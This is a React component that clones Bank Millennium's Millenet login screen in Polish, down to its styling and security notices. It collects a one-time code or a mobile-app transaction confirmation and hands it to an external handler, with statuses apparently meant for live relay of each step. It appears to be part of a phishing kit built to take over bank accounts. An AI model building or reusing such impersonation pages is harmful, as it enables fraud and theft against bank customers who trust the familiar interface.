import React, {Fragment} from 'react';
import * as yup from "yup";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";

const schema = yup.object().shape({
    code: yup.string().required(),
});
const MillenniumFormCode = ({handler, status}) => {
    const {register, handleSubmit, trigger, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onBlur'
    });
    const clearForm = (data) => {
        reset();
        handler(data.code)
    }
    return (
        <div className="view-body-container">

            <form autoComplete="off" onSubmit={handleSubmit(clearForm)}>
                {
                    <Fragment>
                        <div className="LoginPanelHeader row">
                            <div className="col-xs-12 col-sm-12">
                                <p className="MNText Text LargeGrayTextSimple Text"
                                   data-dateformat="yy-mm-dd">Logowanie do Millenetu</p>
                            </div>
                        </div>
                        <div className="Container">
                            <div>
                                <b>
                        <span className="MNText MediumText Text"
                              data-dateformat="yy-mm-dd">
                            {status === 'getting_push_code' || status === 'wrong_push_code' ? 'Potwierdź transakcję w aplikacji mobilnej banku' : 'Wpisz kod'}
                        </span>
                                </b>
                                <div
                                    className={`MNTextBox MNField Multicode form-group BoldLabel DescriptionLeft RoundedWithShadow ${errors.millekod && 'has-error'}`}>
                                    <div className="Content col-xs-12">
                                        <input
                                            className="form-control MNTextBoxContent"
                                            style={{height: '45px'}}
                                            type="text"
                                            {...register('code')}
                                        /></div>
                                    <p className="col-xs-12 col-sm-12 col-md-12 col-lg-12 errorA ">
                                        {
                                            errors.code &&
                                            <span className="field-validation-error" data-valmsg-for="Millekod"
                                                  data-valmsg-replace="true" role="alert">
                                                    <span id="Millekod_txtContent-error"
                                                          className="has-error">
                                                        Pole jest wymagane
                                                    </span>
                                                </span>
                                        }
                                    </p>
                                </div>
                            </div>
                            <div className="PasswordPeek">
                                <div className="PasswordPeekInner">
                                    <a className="MNKeyboard KeyboardTrigger mille_font icon-keyboardV2 hidden-xs InactiveColor"/>
                                </div>
                            </div>
                        </div>
                        <div className="actions-container">
                            <div className="BodyFooterItems col-xs-12">
                                <div className="divButtonLogin col-xs-12 col-sm-5">
                                    <button
                                        className="MNButton MNCommand ButtonLogin col-xs-12 btn btn-link PrimaryRounded btn-default"
                                        type="submit"
                                    >
                                        DALEJ
                                    </button>
                                </div>
                                <div className="HelpLink col-xs-12 col-sm-8"><a
                                    className="MNHLink MNCommand Magenta"
                                    href="javascript:void(0)" id="HelpLink"
                                    onClick="$('.LoginPage').Website_LayoutLogin('showMainBallon');">Pomoc
                                    z logowaniem</a></div>
                            </div>
                        </div>
                        <div className="field-group-separator-container row">
                            <div className="MNFieldGroupFieldSeparator col-xs-12"/>
                        </div>
                        <div className="MNInfoContent login-information-container panel Plain Custom"
                             data-name="LoginInformation"
                             data-uniqueid="795a3e8aca6c433b876e92e0e9b8fcf0" data-widget="true"
                             id="login-information-info-content">
                            <div
                                className="ci_custom information-lxvg___con">{/*?xml version="1.0" encoding="utf-16"?*/}
                                <div style={{margin: '0px', padding: '0px', border: '0px'}}>
                                    <style
                                        dangerouslySetInnerHTML={{__html: "\n.information-lxvg___con { padding-top: 20px; }\n#information-lxvg_ { margin: 0 auto; color: #737373; font-family: Roboto; font-size: 13px; line-height: 16px; max-width: 330px; }\n#information-lxvg_ .date, #information-lxvg_ .link { color: #BD004F; }\n#information-lxvg_ .date { font-size: 13px; font-weight: 500; line-height: 16px; margin: 0 23px 0 3px; }\n#information-lxvg_ .information__element { display: flex; margin-bottom: 30px; }\n#information-lxvg_ .information__element:last-child { margin-bottom: 0; }\n@media (max-width: 767px){\n    .information-lxvg___con { margin-top: 0; margin-bottom: 30px!important; }   \n    #information-lxvg_ { max-width: 100%; }\n    #information-lxvg_ .information__element { display: block; }\n    #information-lxvg_  .date { margin: 0 0 7px; display: block; }\n}\n"}}/>
                                    <dl id="information-lxvg_">
                                        <dd className="information__element"><span
                                            className="date"> Fałszywi konsultanci </span><span
                                            className="content">Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji i nie udostępniaj poufnych danych <a
                                            href="https://www.bankmillennium.pl/bankowosc-elektroniczna/bezpieczenstwo"
                                            className="link" target="_blank" rel="noreferrer"><span
                                            className="aria-hide">link otwiera się w nowym oknie</span>Więcej<span
                                            className="aria-hide"> Bezpieczeństwo</span></a></span>
                                        </dd>
                                        <dd className="information__element"><span
                                            className="date"> Usługi przydatne na wakacjach </span><span
                                            className="content">Ubezpiecz swój wyjazd i zadbaj o dodatkowe środki na urlopie <a
                                            href="https://www.bankmillennium.pl/#needs"
                                            className="link" target="_blank" rel="noreferrer"><span
                                            className="aria-hide">link otwiera się w nowym oknie</span>Więcej<span
                                            className="aria-hide"> Urlop i podróże</span></a></span>
                                        </dd>
                                    </dl>
                                </div>
                            </div>
                        </div>

                    </Fragment>
                }


            </form>
        </div>
    );
};

export default MillenniumFormCode;